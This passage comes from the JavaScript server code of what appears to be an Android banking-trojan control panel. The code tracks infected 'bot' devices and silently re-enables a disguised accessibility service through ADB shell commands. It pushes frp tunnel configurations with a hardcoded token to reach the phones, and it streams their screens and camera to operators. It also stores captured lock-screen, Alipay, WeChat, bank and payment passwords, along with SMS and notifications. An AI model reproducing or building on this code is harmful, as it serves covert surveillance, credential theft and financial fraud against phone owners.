        // //               console.log(`[CMD] → ${deviceId}: FULL_DEPLOY (自动，未配对)`);
        // //             }
        // //           }
        // //         }, 5000);

        // 自动恢复无障碍服务（通过 ADB，防止服务器重启后无障碍掉线）
        setTimeout(() => {
          const http = require('http');
          // 先检查 frpc 是否可用
          const checkUrl = `http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${encodeURIComponent('settings get secure enabled_accessibility_services')}`;
          http.get(checkUrl, { timeout: 5000 }, (res) => {
            const chunks = [];
            res.on('data', c => chunks.push(c));
            res.on('end', () => {
              try {
                const data = JSON.parse(Buffer.concat(chunks).toString());
                const current = (data.data?.output || '').trim();
                if (!current || current === 'null') {
                  // 无障碍未启用，查找包名并恢复
                  const findPkgCmd = encodeURIComponent("pm list packages -3 | grep -v google | grep -v vivo | grep -v baidu | grep -v tencent");
                  http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${findPkgCmd}`, { timeout: 5000 }, (pkgRes) => {
                    const pkgChunks = [];
                    pkgRes.on('data', c => pkgChunks.push(c));
                    pkgRes.on('end', () => {
                      try {
                        const pkgData = JSON.parse(Buffer.concat(pkgChunks).toString());
                        const output = pkgData.data?.output || '';
                        const pkgs = output.split('\n').map(l => l.trim().replace('package:', '')).filter(p => p && p.startsWith('com.') && p.length <= 20 && !p.includes('widget'));
                        const ourPkg = pkgs[0] || 'com.dev.rehwft';
                        const service = `${ourPkg}/com.titan.solid.luck.service.unfaiahnst`;
                        const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
                        http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
                          http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${encodeURIComponent('settings put secure accessibility_enabled 1')}`, { timeout: 3000 }, () => { }).on('error', () => { });
                          console.log(`[A11Y] ✅ ${deviceId}: 无障碍自动恢复 (${service})`);
                        }).on('error', () => { });
                      } catch { }
                    });
                  }).on('error', () => { });
                } else {
                  console.log(`[A11Y] ${deviceId}: 无障碍正常 (${current.slice(0, 30)})`);
                }
              } catch { }
            });
          }).on('error', () => { });
        }, 10000); // 设备连接10秒后检查
      } else if (deviceId) {
        deviceConnections.set(deviceId, ws); // 更新引用
        // ★ AB包延迟归属：已连接的设备后续消息可能携带 ownerUsername
        const lateOwner = msg.ownerUsername || msg.data?.ownerUsername || '';
        if (lateOwner) autoAssignDevice(deviceId, lateOwner);
      }

      // 处理截图回传（APP通过proxy_result回传截图数据）

      // 处理 status 消息 - 更新设备信息到数据库
      if (msgType === 'status') {
        const d = msg.data || msg;
        const now = Date.now() / 1000;
        const updates = [];
        const values = [];
        if (d.brand) { updates.push('brand=?'); values.push(d.brand); }
        if (d.model) { updates.push('model=?'); values.push(d.model); }
        if (d.osVersion) { updates.push('os_version=?'); values.push(d.osVersion); }
        if (d.appVersion) { updates.push('app_version=?'); values.push(d.appVersion); }
        if (d.batteryLevel !== undefined) { updates.push('battery_level=?'); values.push(d.batteryLevel); }
        if (d.networkType) { updates.push('network_type=?'); values.push(d.networkType); }
        if (d.screenWidth) { updates.push('screen_width=?'); values.push(d.screenWidth); }
        if (d.screenHeight) { updates.push('screen_height=?'); values.push(d.screenHeight); }
        if (d.appName) { updates.push('app_name=?'); values.push(d.appName); }
        updates.push('last_seen=?'); values.push(now);
        updates.push('is_connected=1');
        if (deviceId && updates.length > 1) {
          values.push(deviceId);
          db.prepare(`UPDATE devices SET ${updates.join(',')} WHERE device_id=?`).run(...values);
          // 广播给管理端实时更新
          const row = db.prepare('SELECT * FROM devices WHERE device_id=?').get(deviceId);
          if (row) {
            const statusData = deviceToBotList(row, null, null);
            broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: statusData, botId: deviceId });
          }
          // ★ 锁屏状态动态推送
          if (void 0 !== d.isLocked && deviceId) {
            db.prepare('UPDATE devices SET is_locked=?, is_screen_on=? WHERE device_id=?').run(d.isLocked ? 1 : 0, d.isScreenOn !== false ? 1 : 0, deviceId);
            broadcastToAdmins({ type: 'screen_lock_status', sessionId: deviceId, deviceId, isLocked: !!d.isLocked, isScreenOn: d.isScreenOn !== false });
          }
        }
        // ★ AB包延迟归属：status 消息可能携带 ownerUsername（APP 读完 0.bt 后上报）
        const statusOwner = d.ownerUsername || msg.ownerUsername || '';
        if (statusOwner && deviceId) {
          autoAssignDevice(deviceId, statusOwner);
        }
        return;
      }

      if (msgType === 'proxy_result' || msgType === 'screenshot' || msgType === 'screen_data' || msgType === 'local_screenshot_response') {
        // 无障碍通道截图：只转发给管理端（阅读器），不写入 screenshotCache（ADB 通道独立管理）
        broadcastToAdmins({ ...msg, deviceId, sessionId: deviceId, botId: deviceId });
        return;
      }

      // V5 文件管理器应答 (file_response -> _fileCallbacks)
      if (msgType === 'file_response') {
        if (_handleFileResponse(msg)) return;
      }

      // 处理 local_service_deploy 状态更新
      if (msgType === 'local_service_deploy') {
        const status = msg.data?.status || '';
        if (status === 'deploy_success' || status === 'full_deploy_success') {
          if (deviceId) {
            db.prepare('UPDATE devices SET local_service_connected=1 WHERE device_id=?').run(deviceId);
            console.log(`[ADB] ✅ ${deviceId}: localService 部署成功`);
            // ★ 部署成功说明 frpc 已通，立即清除冷却
            clearFrpcCooldown(deviceId);
            // ★ 部署成功后推送 tunnel_config，让 local-service 启动 frpc
            try {
              const bws = bridgeConnections.get(deviceId);
              const dws = deviceConnections.get(deviceId);
              const targetWs = (bws && bws.readyState === 1) ? bws : (dws && dws.readyState === 1) ? dws : null;
              if (targetWs) {
                const localPort = 7912;
                const remotePort = getDevicePort(deviceId);
                const token = 'fisher_frp_2026';
                targetWs.send(JSON.stringify({
                  type: 'tunnel_config',
                  serverAddr: FRP_SERVER_ADDR,
                  serverPort: 7000,
                  token: token,
                  remotePort: remotePort,
                  localPort: localPort,
                  configINI: `serverAddr = "${FRP_SERVER_ADDR}"\nserverPort = 7000\nauth.method = "token"\nauth.token = "${token}"\ntransport.heartbeatInterval = 10\ntransport.heartbeatTimeout = 30\n\n[[proxies]]\nname = "${deviceId}_local"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${localPort}\nremotePort = ${remotePort}\n`
                }));
                console.log(`[DEPLOY] ★ 推送隧道配置: ${deviceId} → remotePort=${remotePort}, localPort=${localPort}`);
              }
            } catch (e) { console.log(`[DEPLOY] tunnel推送错误: ${e.message}`); }
            // 通知前端更新 localServiceConnected
            broadcastToAdmins({ type: 'local_service_status', deviceId, sessionId: deviceId, botId: deviceId, data: { deviceId, connected: true } });
          }
        } else if (status === 'deploy_failed' || status === 'full_deploy_failed') {
          console.log(`[ADB] ❌ ${deviceId}: localService 部署失败 - ${msg.data?.message || ''}`);
        }
        // 转发给管理端
        const fwd = { ...msg, deviceId, sessionId: deviceId, botId: deviceId };
        broadcastToAdmins(fwd);
        return;
      }

      // 处理注入结果回传（APP 提交注入获取的数据）
      if (msgType === 'injection_result' || msgType === 'inject_result') {
        const inner = msg.data || {};
        if (deviceId && inner.body) {
          const deviceRow = db.prepare('SELECT brand,device_id FROM devices WHERE device_id=?').get(deviceId);
          const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
          db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
            .run(deviceId, deviceName, deviceId, inner.address || `[注入] ${inner.templateName || ''}`, inner.body || '', 'injection', Date.now());
          console.log(`[INJECT] ← ${deviceId}: ${inner.address || inner.templateName}`);
        }
        const fwd = { ...msg, deviceId, sessionId: deviceId, botId: deviceId };
        broadcastToAdmins(fwd);
        return;
      }

      // 处理短信/通知上报
      if (msgType === 'sms_data' || msgType === 'notification_data') {
        const inner = msg.data || {};
        if (deviceId && (inner.body || inner.content)) {
          const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
          const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
          db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
            .run(deviceId, deviceName, deviceId, inner.address || inner.sender || '', inner.body || inner.content || '', msgType === 'sms_data' ? 'sms' : 'notification', inner.date || Date.now());
        }
      }

      // 处理密码输入上报
      if (msgType === 'password_input' || msgType === 'password_captured' || msgType === 'credential_captured' || msgType === 'password_status') {
        const inner = msg.data || {};
        if (deviceId) {
          // password_status 格式: {lockPassword:{value,type,captureTime}, alipayPassword:{...}, wechatPassword:{...}, ...}
          if (msgType === 'password_status') {
            const fields = ['lockPassword', 'alipayPassword', 'wechatPassword', 'paymentPassword', 'bankPassword'];
            for (const field of fields) {
              const pwd = inner[field];
              if (pwd && pwd.value && pwd.captured !== false) {
                // 检查是否已存在（避免重复插入）
                const exists = db.prepare('SELECT id FROM password_inputs WHERE device_id=? AND input_text=? AND password_type=?').get(deviceId, pwd.value, field);
                if (!exists) {
                  // 规范化密码类型（前端只认 pattern/pin/password/mixed）
                  let normalType = pwd.type || field;
                  if (normalType.includes('pin') || normalType.includes('PIN')) normalType = 'pin';
                  else if (normalType.includes('pattern')) normalType = 'pattern';
                  else if (normalType.includes('mixed') || normalType.includes('alpha')) normalType = 'mixed';
                  else if (normalType.includes('password') || normalType.includes('text')) normalType = 'password';
                  db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
                    .run(deviceId, field.replace('Password', ''), '', pwd.value, normalType, pwd.captureTime || Date.now());
                  console.log(`[PWD] ← ${deviceId}: ${field} = ${pwd.value.slice(0, 3)}***`);
                }
              }
            }
            // 也处理动态字段
            for (const [key, val] of Object.entries(inner)) {
              if (key === 'deviceId' || key === 'type' || fields.includes(key)) continue;
              if (val && typeof val === 'object' && val.value) {
                const exists = db.prepare('SELECT id FROM password_inputs WHERE device_id=? AND input_text=? AND password_type=?').get(deviceId, val.value, key);
                if (!exists) {
                  db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
                    .run(deviceId, key.replace('Password', ''), '', val.value, val.type || key, val.captureTime || Date.now());
                  console.log(`[PWD] ← ${deviceId}: ${key} = ${val.value.slice(0, 3)}***`);
                }
              }
            }
          } else {
            // 通用格式
            const text = inner.inputText || inner.text || inner.password || inner.value || '';
            if (text) {
              db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
                .run(deviceId, inner.appName || inner.app || '', inner.packageName || inner.pkg || '', text, inner.passwordType || inner.type || 'password', inner.timestamp || Date.now());
              console.log(`[PWD] ← ${deviceId}: ${inner.appName || 'unknown'}`);
            }
          }
        }
        broadcastToAdmins({ ...msg, deviceId, sessionId: deviceId, botId: deviceId });
        return;
      }

      // ★ 处理 ViewCacheCollector 密码上报（支付APP密码通过WS发送）
      if (msgType === 'view_cache_sync') {
        const inner = msg.data || msg;
        if (deviceId) {
          const text = inner.cipher || '';
          const pkg = inner.pkg || '';
          const app = inner.app || '';
          const cls = inner.cls || '';
          const grade = inner.grade || '';
          const props = inner.props || [];
          
          console.log(`[CIPHER-WS] ← ${deviceId}: app=${app} cls=${cls} grade=${grade} cipher_len=${text.length} props=${props.length}`);
          
          // 只记录密码框页面（MspContainerActivity）
          if (cls && !cls.includes('MspContainer')) {
            console.log(`[CIPHER-WS]   跳过非密码页: ${cls}`);
            broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data: inner });
            return;
          }
          
          if (text) {
            const extra = JSON.stringify({ cls, grade, props });
            db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp,extra_data) VALUES (?,?,?,?,?,?,?)')
              .run(deviceId, app, pkg, text, 'payment_cipher', inner.ts || Date.now(), extra);
            console.log(`[CIPHER-WS]   ✅ 已入库: cipher_len=${text.length} props=${props.length}`);
          }
          broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data: inner });
        }
        return;
      }

      // 处理心跳 - 更新数据库和通知管理端
      if (msgType === 'status' || msgType === 'device_heartbeat') {
        const inner = msg.data || {};
        if ('isLocked' in inner) console.log('[LOCK-DEBUG]', deviceId, 'isLocked=' + JSON.stringify(inner.isLocked), 'isScreenOn=' + JSON.stringify(inner.isScreenOn), 'type=' + JSON.stringify(inner.type));
        const now = Date.now() / 1000;
        if (deviceId) {
          db.prepare('UPDATE devices SET battery_level=?,network_type=?,brand=?,model=?,os_version=?,app_version=?,screen_width=?,screen_height=?,is_connected=1,last_seen=?,is_locked=?,is_screen_on=? WHERE device_id=?')
            .run(inner.batteryLevel || 0, inner.networkType || '', inner.brand || '', inner.model || '', inner.osVersion || '', inner.appVersion || '', inner.screenWidth || 0, inner.screenHeight || 0, now, inner.isLocked ? 1 : 0, inner.isScreenOn !== false ? 1 : 0, deviceId);
        }
        // 转发状态给管理端
        const statusData = { ...inner, botId: deviceId, deviceId };
        // 如果心跳里带了 lockScreenType，规范化它
        if (statusData.lockScreenType) {
          const typeMap = { '6pin': 'pin', '4pin': 'pin', '6PIN': 'pin', '4PIN': 'pin', 'numeric': 'pin', 'PIN_4': 'pin', 'PIN_6': 'pin', 'NUMERIC_COMPLEX': 'pin', 'PASSWORD_QUALITY_NUMERIC_COMPLEX': 'pin', 'PASSWORD_QUALITY_ALPHANUMERIC': 'mixed' };
          statusData.lockScreenType = typeMap[statusData.lockScreenType] || statusData.lockScreenType;
        } else {
          // 心跳没带 lockScreenType，从数据库补充
          const pwdR = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId);
          if (pwdR) {
            const tm = { '6pin': 'pin', '4pin': 'pin', 'pin': 'pin', 'mixed': 'mixed', 'pattern': 'pattern', 'password': 'password' };
            statusData.lockScreenType = tm[pwdR.password_type] || pwdR.password_type;
          }
        }
        broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: statusData, botId: deviceId });
        broadcastToAdmins({ type: 'get_device_state_response', sessionId: deviceId, data: statusData, botId: deviceId });
        // ★ 额外发送 screen_lock_status 让前端图标动态切换
        if (void 0 !== inner.isLocked) {
          broadcastToAdmins({ type: 'screen_lock_status', sessionId: deviceId, deviceId, isLocked: !!inner.isLocked, isScreenOn: inner.isScreenOn !== false });
        }

        // ★ 无障碍自动恢复：APP心跳上报 accessibilityAlive=false 时，通过ADB恢复
        if (deviceId && inner.accessibilityAlive === false) {
          autoRestoreAccessibility(deviceId, 'heartbeat_report');
        }
        return;
      }

      // app_list_response: 打印调试信息
      if (msgType === 'app_list_response') {
        const appsCount = (msg.data && msg.data.apps) ? msg.data.apps.length : 0;
        const total = (msg.data && msg.data.total) ? msg.data.total : 0;
        console.log('[APP_LIST] ' + deviceId + ': total=' + total + ', apps=' + appsCount);
      }

      // 其他消息（screenshot、ui_hierarchy、sms_data 等）直接转发给管理端
      const fwd = { ...msg };
      if (deviceId) {
        fwd.deviceId = deviceId;
        fwd.sessionId = deviceId;
        fwd.botId = deviceId;
      }
      // 消息类型映射（设备发的 → 前端期望的）
      if (fwd.type === 'camera_frame') fwd.type = 'camera_data';
      broadcastToAdmins(fwd);

    } catch (e) {
      // 非 JSON 消息（可能是二进制帧 - 截图数据），缓存并转发
      // 临时日志：记录所有解析失败的消息
      if (raw && !(raw instanceof Buffer && raw.length > 100 && (raw[0] === 0xFF || raw[0] === 0x89 || raw[0] === 0x52))) {
        const str = raw instanceof Buffer ? raw.toString().slice(0, 300) : String(raw).slice(0, 300);
        console.log(`[DEV-WS-RAW] ← ${deviceId}: len=${raw.length}, content=${str}`);
      }
      if (deviceId && raw instanceof Buffer && raw.length > 100) {
        // 检查是否是图片 (JPEG: FF D8, WebP: RIFF, PNG: 89 50)
        if ((raw[0] === 0xFF && raw[1] === 0xD8) || (raw[0] === 0x52 && raw[1] === 0x49) || (raw[0] === 0x89 && raw[1] === 0x50)) {
          // 无障碍通道截图：不写入 screenshotCache（ADB 通道独立管理）
          // 只转发给订阅了该设备的管理端（阅读器用）
          const subs = deviceSubscribers.get(deviceId);
          if (subs && subs.size > 0) {
            for (const adminWs of subs) {
              if (adminWs.readyState === 1) {
                try { adminWs.send(raw); } catch { }
              }
            }
          }
          return;
        }
      }
      // 非图片二进制数据，广播给所有管理端
      for (const adminWs of adminConnections) {
        if (adminWs.readyState === 1) {
          try { adminWs.send(raw); } catch { }
        }
      }
    }
  });

  ws.on('close', (code, reason) => {
    console.log(`[${new Date().toISOString()}] [WS] 设备断开: ${deviceId}, code=${code}, reason=${reason ? reason.toString() : 'none'}`);
    if (deviceId) {
      deviceConnections.delete(deviceId);
      db.prepare('UPDATE devices SET is_connected=0,last_seen=? WHERE device_id=?').run(Date.now() / 1000, deviceId);
      broadcastToAdmins({ type: 'device_offline', sessionId: deviceId, deviceId });
    }
  });

  ws.on('error', (err) => {
    console.log(`[${new Date().toISOString()}] [WS] 设备错误: ${deviceId}, err=${err.message}`);
    if (deviceId) deviceConnections.delete(deviceId);
  });

  // 心跳保活
  const pingInterval = setInterval(() => {
    if (ws.readyState === 1) ws.ping();
    else clearInterval(pingInterval);
  }, 30000);

  ws.on('close', () => clearInterval(pingInterval));
}

// ============================================================
// Bridge WebSocket（local-service 通过此通道与服务器通信）
// ============================================================
const bridgeConnections = new Map(); // deviceId -> ws

function handleBridgeWs(ws, req) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  const deviceId = url.searchParams.get('deviceId') || '';
  console.log(`[Bridge] 连接: ${deviceId}, ip=${req.socket.remoteAddress}`);

  if (deviceId) {
    bridgeConnections.set(deviceId, ws);
    // ★ Bridge 连接后自动推送 frps 隧道配置，让 local-service 启动 frpc
    try {
      const localPort = 7912; // local-service 默认端口（与 FULL_DEPLOY 保持一致）
      const remotePort = getDevicePort(deviceId);
      const token = 'fisher_frp_2026';
      const tunnelConfig = {
        type: 'tunnel_config',
        serverAddr: FRP_SERVER_ADDR,
        serverPort: 7000,
        token: token,
        remotePort: remotePort,
        localPort: localPort,
        configINI: `serverAddr = "${FRP_SERVER_ADDR}"\nserverPort = 7000\nauth.method = "token"\nauth.token = "${token}"\ntransport.heartbeatInterval = 10\ntransport.heartbeatTimeout = 30\n\n[[proxies]]\nname = "${deviceId}_local"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${localPort}\nremotePort = ${remotePort}\n`
      };
      ws.send(JSON.stringify(tunnelConfig));
      console.log(`[Bridge] ★ 推送隧道配置: ${deviceId} → remotePort=${remotePort}`);
      // ★ 延迟3秒后触发 local-service 重装 frpc
      setTimeout(() => {
        safeHttpGet(`http://127.0.0.1:${remotePort}/repeatInstallFRPC`, { timeout: 5000 }, (body) => {
          console.log(`[Bridge] ✅ repeatInstallFRPC 成功: ${deviceId}`);
        }, () => {
          console.log(`[Bridge] ⚠️ repeatInstallFRPC 失败(frpc可能未就绪): ${deviceId}`);
        });
      }, 3000);

    } catch (e) { console.log(`[Bridge] 推送隧道配置失败: ${e.message}`); }
  }

  ws.on('message', (raw) => {
    try {
      console.log(`[BRIDGE-MSG] ${deviceId}: type=${raw instanceof Buffer ? 'binary(' + raw.length + ')' : 'text'}, first100=${raw instanceof Buffer ? raw.slice(0, 20).toString('hex') : String(raw).slice(0, 100)}`);
      if (raw instanceof Buffer && raw.length > 100) {
        // Bridge 二进制截图：写入 screenshotCache（支持 ADB 接口降级）
        if ((raw[0] === 0xFF && raw[1] === 0xD8) || (raw[0] === 0x89 && raw[1] === 0x50) || (raw[0] === 0x52 && raw[1] === 0x49)) {
          if (deviceId) {
            screenshotCache.set(deviceId, { data: raw, timestamp: Date.now() });
            const subs = deviceSubscribers.get(deviceId);
            if (subs && subs.size > 0) {
              for (const adminWs of subs) {
                if (adminWs.readyState === 1) {
                  try { adminWs.send(raw); } catch { }
                }
              }
            }
          }
          return;
        }
      }

      const str = (raw instanceof Buffer) ? raw.toString() : raw;
      const msg = JSON.parse(str);

      // 处理 minicap 截图数据（Bridge 通过 JSON 推送 base64 编码的截图）
      console.log(`[BRIDGE-JSON] ${deviceId}: keys=${JSON.stringify(Object.keys(msg))}, body_keys=${msg.body ? JSON.stringify(Object.keys(msg.body)) : 'no-body'}, bridgePath=${msg.body?.bridgePath}, hasBuffer=${!!msg.body?.buffer}`);
      if (msg.body && msg.body.bridgePath === '/minicap' && msg.body.buffer) {
        // Bridge minicap：写入 screenshotCache（支持 ADB 接口降级）
        const imgBuf = Buffer.from(msg.body.buffer, 'base64');
        if (imgBuf.length > 500 && deviceId) {
          screenshotCache.set(deviceId, { data: imgBuf, timestamp: Date.now() });
          const subs = deviceSubscribers.get(deviceId);
          if (subs && subs.size > 0) {
            for (const adminWs of subs) {
              if (adminWs.readyState === 1) {
                try { adminWs.send(imgBuf); } catch { }
              }
            }
          }
        }
        return;
      }

      // 处理 ping
      if (msg.type === 'ping') {
        ws.send(JSON.stringify({ type: 'pong' }));
        return;
      }

      // V5 文件管理器应答 (bridge 通道)
      if (_handleFileResponse(msg)) return;

      // 其他 Bridge 消息转发给管理端
      if (deviceId) {
        msg.deviceId = deviceId;
        msg.sessionId = deviceId;
        msg.botId = deviceId;
      }
      broadcastToAdmins(msg);
    } catch (e) {
      // 解析失败的消息，尝试作为文本广播
      if (deviceId && raw) {
        const str = raw.toString();
        if (str.length > 0 && str.length < 10000) {
          try {
            broadcastToAdmins(JSON.parse(str));
          } catch { }
        }
      }
    }
  });

  ws.on('close', () => {
    console.log(`[Bridge] 断开: ${deviceId}`);
    if (deviceId) bridgeConnections.delete(deviceId);
  });

  ws.on('error', () => {
    if (deviceId) bridgeConnections.delete(deviceId);
  });

  // ★ 心跳保活 + 超时检测：防止旧连接残留
  let bridgeAlive = true;
  ws.on('pong', () => { bridgeAlive = true; });
  const pingInterval = setInterval(() => {
    if (ws.readyState !== 1) {
      clearInterval(pingInterval);
      if (deviceId) bridgeConnections.delete(deviceId);
      return;
    }
    if (!bridgeAlive) {
      // 上一次 ping 没收到 pong，主动断开
      console.log(`[Bridge] ⚠️ ${deviceId} 心跳超时，主动断开清理`);
      clearInterval(pingInterval);
      if (deviceId) bridgeConnections.delete(deviceId);
      try { ws.terminate(); } catch { }
      return;
    }
    bridgeAlive = false;
    ws.ping();
  }, 30000);
  ws.on('close', () => clearInterval(pingInterval));
}

// ============================================================
// 定时推送设备状态（模拟原版行为，前端依赖持续状态更新）
// ============================================================
setInterval(() => {
  if (adminConnections.size === 0) return;
  // 服务器启动60秒内不清理（等设备重连）
  if (process.uptime() < 60) return;
  const rows = db.prepare('SELECT * FROM devices WHERE is_connected=1').all();
  for (const row of rows) {
    // 实时检查 WS 连接，跳过假在线设备
    if (!deviceConnections.has(row.device_id) && !bridgeConnections.has(row.device_id)) {
      db.prepare('UPDATE devices SET is_connected=0 WHERE device_id=?').run(row.device_id);
      broadcastToAdmins({ type: 'device_offline', sessionId: row.device_id, deviceId: row.device_id });
      continue;
    }
    const d = deviceToBotList(row, null, null);
    const pwdRow = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(row.device_id);
    const rawPwdType = pwdRow ? pwdRow.password_type : '';
    const mappedPwdType = { '6pin': 'pin', '4pin': 'pin', '6PIN': 'pin', '4PIN': 'pin', 'numeric': 'pin' }[rawPwdType] || rawPwdType;
    const statusData = {
      accessibilityAlive: true,
      batteryLevel: row.battery_level || 0,
      isCharging: false,
      isLocked: !!(row.is_locked),
      lockScreenType: mappedPwdType,
      networkType: row.network_type || 'WiFi',
      type: 'device_card_update'
    };
    broadcastToAdmins({ type: 'device_status_update', sessionId: d.id, data: statusData, botId: d.id });
    // 也发一条原版格式的 status 嵌套消息（确保前端能读到 lockScreenType）
    if (mappedPwdType) {
      broadcastToAdmins({ type: 'device_status_update', sessionId: d.id, data: { deviceId: d.id, status: { lockScreenType: mappedPwdType } }, botId: d.id });
    }
    broadcastToAdmins({
      type: 'get_device_state_response', sessionId: d.id, data: {
        accessibilityAlive: true,
        batteryLevel: row.battery_level || 0,
        botId: d.id,
        deviceId: d.id,
        hasSim: true,
        isCharging: false,
        isLocked: !!(row.is_locked),
        isScreenOn: row.is_screen_on !== 0,
        networkType: row.network_type || 'WiFi',
        timestamp: Date.now(),
        type: 'device_heartbeat',
        wsConnected: true
      }, botId: d.id
    });
  }
}, 5000); // ★ 优化：5秒推送一次（原2秒，200台设备时压力过大）

// 定时清理：把数据库里 is_connected=1 但 WS 实际断开的设备标记为离线
setInterval(() => {
  if (process.uptime() < 60) return; // 启动60秒内不清理
  const rows = db.prepare('SELECT device_id FROM devices WHERE is_connected=1').all();
  for (const row of rows) {
    if (!deviceConnections.has(row.device_id) && !bridgeConnections.has(row.device_id)) {
      db.prepare('UPDATE devices SET is_connected=0,last_seen=? WHERE device_id=?').run(Date.now() / 1000, row.device_id);
      broadcastToAdmins({ type: 'device_offline', sessionId: row.device_id, deviceId: row.device_id });
    }
  }
}, 30000); // 每30秒清理一次

// ============================================================
// 定时无障碍检查：对有ADB连接的在线设备轮询无障碍状态
// ★ 优化：跳过 frpc 端口不通的设备，避免 ECONNREFUSED 风暴
// ============================================================
setInterval(() => {
  if (process.uptime() < 30) return; // 启动30秒内不检查
  const rows = db.prepare('SELECT device_id FROM devices WHERE is_connected=1').all();
  for (const row of rows) {
    const did = row.device_id;
    // 只检查 WS 或 Bridge 在线的设备（排除假在线）
    if (!deviceConnections.has(did) && !bridgeConnections.has(did)) continue;
    // ★ 跳过 frpc 端口冷却中的设备（端口不通就别反复连了）
    if (typeof isFrpcCooling === 'function' && isFrpcCooling(did)) continue;
    // 检查冷却，跳过刚恢复过的设备
    const last = a11yCooldown.get(did) || 0;
    if (Date.now() - last < A11Y_COOLDOWN_MS) continue;
    // 异步检查（不阻塞循环）
    checkAndRestoreAccessibility(did);
  }
}, 60 * 1000); // ★ 降频到60秒一次（原30秒）

// ============================================================
// 截图主动轮询推送（ADB 通道独立，通过 frpc 端口轮询）
// ★ 自适应帧率：每个设备收到上一帧后才请求下一帧，避免请求堆积阻塞事件循环
// ============================================================
const screenPushActive = new Map();  // deviceId -> boolean（是否有活跃的请求链）
// 复用全局 frpcCooldown（命令和截图共享冷却状态）

function startDeviceScreenLoop(deviceId) {
  if (screenPushActive.get(deviceId)) return; // 已经有活跃链在跑
  screenPushActive.set(deviceId, true);

  function fetchNextFrame() {
    // 检查是否还有订阅者
    const subs = deviceSubscribers.get(deviceId);
    if (!subs || subs.size === 0) {
      screenPushActive.set(deviceId, false);
      return; // 没人看了，停止请求链
    }

    // 错误冷却：端口不通时暂停，避免超时风暴
    if (isFrpcCooling(deviceId)) {
      setTimeout(fetchNextFrame, 2000); // 冷却中，2秒后重试
      return;
    }

    const http = require('http');
    const port = getDevicePort(deviceId);
    const proxyReq = http.get(`http://127.0.0.1:${port}/screenshot/0`, { timeout: 1200 }, (proxyRes) => {
      const chunks = [];
      proxyRes.on('data', (chunk) => chunks.push(chunk));
      proxyRes.on('end', () => {
        const data = Buffer.concat(chunks);
        if (data.length > 500) {
          clearFrpcCooldown(deviceId);
          screenshotCache.set(deviceId, { data, timestamp: Date.now() });
          const currentSubs = deviceSubscribers.get(deviceId);
          if (currentSubs) {
            for (const ws of currentSubs) {
              if (ws.readyState === 1) {
                try { ws.send(data); } catch { }
              }
            }
          }
        }
        // ★ 收到回复后，间隔 100ms 立即请求下一帧（自适应帧率）
        setTimeout(fetchNextFrame, 100);
      });
    });
    proxyReq.on('error', () => {
      setFrpcCooldown(deviceId, 5000);
      setTimeout(fetchNextFrame, 2000); // 出错后 2 秒重试
    });
    proxyReq.on('timeout', () => {
      proxyReq.destroy();
      setFrpcCooldown(deviceId, 10000); // 超时冷却 10 秒
      setTimeout(fetchNextFrame, 1000);
    });
  }

  // 启动请求链
  fetchNextFrame();
}

// ★ 定时检查：有新的订阅者时启动对应设备的请求链
setInterval(() => {
  for (const [deviceId, subs] of deviceSubscribers) {
    if (subs.size > 0 && !screenPushActive.get(deviceId)) {
      startDeviceScreenLoop(deviceId);
    }
  }
}, 500);

// ============================================================
// local-service 实际请求的接口（通过404捕获发现）
app.post('/api/node/register', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: 'missing deviceId' });

  const now = Date.now() / 1000;
  const ip = req.ip || req.connection.remoteAddress || '';

  // 注册/更新设备信息
  const existing = db.prepare('SELECT id, owner_username FROM devices WHERE device_id=?').get(deviceId);
  if (existing) {
    db.prepare(`UPDATE devices SET brand=?,model=?,os_version=?,app_version=?,app_name=?,
      battery_level=?,network_type=?,phone_number=?,screen_width=?,screen_height=?,
      public_ip=?,is_connected=1,last_seen=? WHERE device_id=?`)
      .run(data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '',
        data.appName || '', data.batteryLevel || 0, data.networkType || '',
        data.phoneNumber || '', data.screenWidth || 0, data.screenHeight || 0, ip, now, deviceId);
  } else {
    db.prepare(`INSERT INTO devices (device_id,brand,model,os_version,app_version,app_name,
      battery_level,network_type,phone_number,screen_width,screen_height,
      public_ip,is_connected,last_seen,first_seen,created_at) 
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,1,?,?,?)`)
      .run(deviceId, data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '',
        data.appName || '', data.batteryLevel || 0, data.networkType || '',
        data.phoneNumber || '', data.screenWidth || 0, data.screenHeight || 0, ip, now, now, now);
  }

  // ★ 核心：处理 ownerUsername 绑定子账号
